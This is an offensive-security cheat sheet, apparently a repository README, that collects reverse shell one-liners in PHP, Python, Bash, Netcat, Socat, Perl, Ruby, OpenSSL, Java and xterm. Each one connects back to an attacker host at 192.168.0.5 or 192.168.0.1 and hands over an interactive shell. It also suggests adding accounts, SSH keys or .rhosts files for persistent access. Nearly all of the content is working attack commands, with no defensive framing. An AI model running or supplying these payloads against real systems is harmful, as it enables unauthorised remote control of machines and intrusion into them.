# Compendium
Compendium:  A concise but detailed collection of Scripts, Reverse Shells and Commands for Offensive Security. 

### Reverse Shell Cheat Sheet

It is always worth trying to add a new account / SSH key / .rhosts file and just log in.

These scripts are designed for Linux systems but to make them work on Windows replace “/bin/sh -i” with “cmd.exe”.

#### Php :

```
php -r '$sock=fsockopen("192.168.0.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

#### Python :

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### Bash :

```
bash -i >& /dev/tcp/192.168.0.1/8080 0>&1
```

#### Netcat :

```
nc -e /bin/sh 192.168.0.5 4444
```

#### Socat :

```
socat tcp-connect:192.168.0.5:4444 system:/bin/sh
```

#### Perl :

```
perl -e 'use Socket;$i="192.168.0.5";$p=4545;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### Ruby :

```
ruby -rsocket -e'f=TCPSocket.open("192.168.0.5",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

#### OpenSSL:

On your machine (to receive, not a normal TCP connection)
```
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes # generate some arbitrary cert
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
```

On PWN'd client
```
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.0.5:4444 > /tmp/s; rm /tmp/s
```

#### Java :

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5< >/dev/tcp/192.168.0.5/4444;cat <& 5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

#### xterm :

```
xterm -display 192.168.0.5:4444
```
